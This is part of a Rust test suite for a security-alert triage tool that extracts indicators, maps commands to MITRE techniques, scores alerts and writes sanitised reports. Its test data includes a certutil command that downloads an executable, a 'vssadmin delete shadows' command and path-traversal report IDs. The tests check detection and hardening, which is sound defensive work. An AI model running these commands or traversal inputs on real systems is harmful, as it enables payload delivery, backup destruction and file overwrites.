    async fn extract_iocs_tool() {
        let dir = tempfile::tempdir().unwrap();
        let t = tool("extract_iocs");
        let out = t
            .call(
                json!({"text": "beacon hxxp://evil[.]top/x 8.8.8.8 10.0.0.1"}),
                &ctx(dir.path()),
            )
            .await;
        let v = parse(&out);
        assert_eq!(v["by_type"]["ipv4"], 2);
        let iocs = v["iocs"].as_array().unwrap();
        assert!(iocs.iter().any(|i| i["value"] == "http://evil.top/x"
            && i["defanged"] == true
            && i["enrichable"] == true));
        let out = t
            .call(
                json!({"text": "8.8.8.8 10.0.0.1", "enrichable_only": true}),
                &ctx(dir.path()),
            )
            .await;
        assert_eq!(parse(&out)["count"], 1);
        let out = t
            .call(json!({"json": {"data": {"win": {"eventdata": {"queryName": "x.evil.top"}}}}, "types": ["domain"]}), &ctx(dir.path()))
            .await;
        assert_eq!(
            parse(&out)["iocs"][0]["sources"][0],
            "data.win.eventdata.queryName"
        );
        let out = t.call(json!({}), &ctx(dir.path())).await;
        assert!(out.is_error);
        let out = t
            .call(json!({"text": "x", "types": ["bogus"]}), &ctx(dir.path()))
            .await;
        assert!(out.is_error);
    }

    #[tokio::test]
    async fn input_size_limit() {
        let dir = tempfile::tempdir().unwrap();
        let tools = intel_tools(IntelToolOptions {
            max_input_bytes: 100,
            ..Default::default()
        });
        let t = tools
            .iter()
            .find(|t| t.spec().name == "extract_iocs")
            .unwrap();
        let out = t
            .call(json!({"text": "a".repeat(500)}), &ctx(dir.path()))
            .await;
        assert!(out.is_error);
        assert!(out.content.contains("too large"));
    }

    #[tokio::test]
    async fn map_mitre_and_hints_tools() {
        let dir = tempfile::tempdir().unwrap();
        let out = tool("map_mitre")
            .call(json!({"technique_ids": ["T1059.001", "T1999"], "command_line": "vssadmin delete shadows /all"}), &ctx(dir.path()))
            .await;
        let v = parse(&out);
        assert_eq!(
            v["lookups"][0]["name"],
            "Command and Scripting Interpreter: PowerShell"
        );
        assert_eq!(v["lookups"][1]["known"], false);
        assert_eq!(v["mappings"][0]["technique_id"], "T1490");
        assert!(v["tactics"].as_array().unwrap().contains(&json!("Impact")));
        let out = tool("map_mitre").call(json!({}), &ctx(dir.path())).await;
        assert!(out.is_error);

        let out = tool("investigation_hints")
            .call(
                json!({"alert": "{\"rule\":{\"groups\":[\"sysmon\",\"sysmon_eid3_detections\"]}}"}),
                &ctx(dir.path()),
            )
            .await;
        let v = parse(&out);
        assert_eq!(v["templates"][0], "sysmon_event_3.txt");
        assert!(v["hints"].as_array().unwrap().len() > 3);
    }

    #[tokio::test]
    async fn analyze_and_score_tools() {
        let dir = tempfile::tempdir().unwrap();
        let out = tool("analyze_command_line")
            .call(json!({"command_line": "certutil -urlcache -f http://203.0.113.9/p.exe C:\\Users\\Public\\p.exe",
                         "parent_image": "C:\\Windows\\System32\\cmd.exe",
                         "image": "C:\\Windows\\System32\\certutil.exe"}), &ctx(dir.path()))
            .await;
        let v = parse(&out);
        assert!(v["score"].as_u64().unwrap() >= 60);
        assert!(
            v["iocs"]
                .as_array()
                .unwrap()
                .iter()
                .any(|i| i["value"] == "http://203.0.113.9/p.exe")
        );
        assert_eq!(v["mitre"][0]["technique_id"], "T1105");
        assert!(
            tool("analyze_command_line")
                .call(json!({}), &ctx(dir.path()))
                .await
                .is_error
        );

        let low = parse(
            &tool("score_alert")
                .call(json!({"rule_level": 5}), &ctx(dir.path()))
                .await,
        );
        let high = parse(&tool("score_alert").call(json!({"rule_level": 5, "intel_verdict": "Malicious", "asset_criticality": "critical"}), &ctx(dir.path())).await);
        assert!(high["triage"]["score"].as_u64() > low["triage"]["score"].as_u64());
        let out = tool("score_alert")
            .call(json!({"alert": {"rule": {"level": 12, "mitre": {"id": ["T1003.001"]}}}, "prior_sightings": 3}), &ctx(dir.path()))
            .await;
        let v = parse(&out);
        assert_eq!(v["derived"]["tactics"][0], "Credential Access");
        assert!(
            v["triage"]["rationale"]
                .as_array()
                .unwrap()
                .iter()
                .any(|r| r.as_str().unwrap().contains("seen 3 time"))
        );
        assert!(
            tool("score_alert")
                .call(json!({"rule_level": 99}), &ctx(dir.path()))
                .await
                .is_error
        );
        assert!(
            tool("score_alert")
                .call(json!({"tactics": ["nope"]}), &ctx(dir.path()))
                .await
                .is_error
        );
        assert!(
            tool("score_alert")
                .call(
                    json!({"asset_criticality": "huge", "rule_level": 1}),
                    &ctx(dir.path())
                )
                .await
                .is_error
        );
    }

    #[tokio::test]
    async fn correlate_tool() {
        let dir = tempfile::tempdir().unwrap();
        let alerts = json!([
            {"_id": "1", "timestamp": "2024-05-01T10:00:00Z", "agent": {"name": "WS1"}},
            {"_id": "2", "timestamp": "2024-05-01T10:30:00Z", "agent": {"name": "WS1"}},
            {"_id": "3", "timestamp": "2024-05-01T10:30:00Z", "agent": {"name": "WS2"}}
        ]);
        let v = parse(
            &tool("correlate_alerts")
                .call(json!({"alerts": alerts}), &ctx(dir.path()))
                .await,
        );
        assert_eq!(v["clusters"][0]["alert_ids"], json!(["1", "2"]));
        assert_eq!(v["singletons"], json!(["3"]));
        let v = parse(
            &tool("correlate_alerts")
                .call(
                    json!({"alerts": alerts, "window_minutes": 10}),
                    &ctx(dir.path()),
                )
                .await,
        );
        assert!(v["clusters"].as_array().unwrap().is_empty());
        let v = parse(
            &tool("correlate_alerts")
                .call(
                    json!({"alerts": alerts, "link_on": ["user"]}),
                    &ctx(dir.path()),
                )
                .await,
        );
        assert!(v["clusters"].as_array().unwrap().is_empty());
        assert!(
            tool("correlate_alerts")
                .call(json!({"alerts": []}), &ctx(dir.path()))
                .await
                .is_error
        );
        assert!(
            tool("correlate_alerts")
                .call(
                    json!({"alerts": alerts, "link_on": ["x"]}),
                    &ctx(dir.path())
                )
                .await
                .is_error
        );
    }

    fn report_json() -> Value {
        json!({
            "alert_id": "48213/../x",
            "verdict": "true_positive",
            "confidence": 80,
            "severity": "High",
            "summary": "Macro document spawned PowerShell that downloaded a payload.",
            "iocs": [{"value": "185.220.101[.]4", "type": "ip", "verdict": "malicious", "details": "Tor exit"}],
            "mitre": [{"technique_id": "T1059.001", "name": "PowerShell", "tactic": "Execution", "rationale": "encoded command"}],
            "timeline": [{"timestamp": "2024-05-01T12:00:00Z", "event": "WINWORD spawned powershell"}],
            "evidence": [{"observation": "parent WINWORD.EXE", "source": "sysmon 1", "assessment": "supports_malicious"}],
            "recommended_actions": [{"action": "Isolate the host", "priority": "immediate", "rationale": "active C2"}]
        })
    }

    #[tokio::test]
    async fn submit_report_writes_files() {
        let dir = tempfile::tempdir().unwrap();
        let t = tool("submit_triage_report");
        let out = t
            .call(json!({"report": report_json()}), &ctx(dir.path()))
            .await;
        assert!(!out.is_error, "{}", out.content);
        assert!(out.content.contains("CoPilot severity_assessment: High"));
        assert!(out.content.contains("# Triage report: alert 48213/../x"));
        // Path separators in the alert id never escape the reports dir.
        let json_path = dir.path().join("reports").join("48213_.._x.json");
        let md_path = dir.path().join("reports").join("48213_.._x.md");
        let saved: Value = serde_json::from_slice(&std::fs::read(&json_path).unwrap()).unwrap();
        assert_eq!(saved["iocs"][0]["value"], "185.220.101.4");
        assert_eq!(saved["severity"], "high");
        assert!(
            std::fs::read_to_string(&md_path)
                .unwrap()
                .contains("185[.]220[.]101[.]4")
        );
        let leftovers: Vec<_> = std::fs::read_dir(dir.path().join("reports"))
            .unwrap()
            .filter_map(Result::ok)
            .filter(|e| e.file_name().to_string_lossy().ends_with(".tmp"))
            .collect();
        assert!(leftovers.is_empty());

        let out = t
            .call(
                json!({"report": report_json(), "report_id": "custom-1"}),
                &ctx(dir.path()),
            )
            .await;
        assert!(!out.is_error);
        assert!(dir.path().join("reports/custom-1.json").exists());
        let out = t
            .call(
                json!({"report": report_json(), "report_id": "../evil"}),
                &ctx(dir.path()),
            )
            .await;
        assert!(out.is_error);
    }

    #[tokio::test]
    async fn submit_report_rejects_invalid() {
        let dir = tempfile::tempdir().unwrap();
        let t = tool("submit_triage_report");
        let mut r = report_json();
        r["iocs"][0]["value"] = json!("not-an-ip");
        let out = t.call(json!({"report": r}), &ctx(dir.path())).await;
        assert!(out.is_error);
        assert!(out.content.contains("iocs[0].value"));
        assert!(!dir.path().join("reports").exists());
        let mut r = report_json();
        r["unexpected"] = json!(true);
        assert!(
            t.call(json!({"report": r}), &ctx(dir.path()))
                .await
                .is_error
        );
        assert!(t.call(json!({}), &ctx(dir.path())).await.is_error);
        let c = ctx(dir.path());
        c.cancel.cancel();
        assert!(t.call(json!({"report": report_json()}), &c).await.is_error);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn submit_report_refuses_symlinked_dir() {
        let dir = tempfile::tempdir().unwrap();
        let elsewhere = tempfile::tempdir().unwrap();
        std::os::unix::fs::symlink(elsewhere.path(), dir.path().join("reports")).unwrap();
        let out = tool("submit_triage_report")
            .call(json!({"report": report_json()}), &ctx(dir.path()))
            .await;
        assert!(out.is_error, "{}", out.content);
        assert!(
            std::fs::read_dir(elsewhere.path())
                .unwrap()
                .next()
                .is_none()
        );
    }

    #[test]
    fn report_ids() {
        assert!(valid_report_id("copilot-inv-123-1700000000"));
        assert!(!valid_report_id(".hidden"));
        assert!(!valid_report_id("a/b"));
        assert!(!valid_report_id(""));
        assert_eq!(derive_report_id("..//x"), "__x");
        assert_eq!(derive_report_id(""), "report");
    }
}
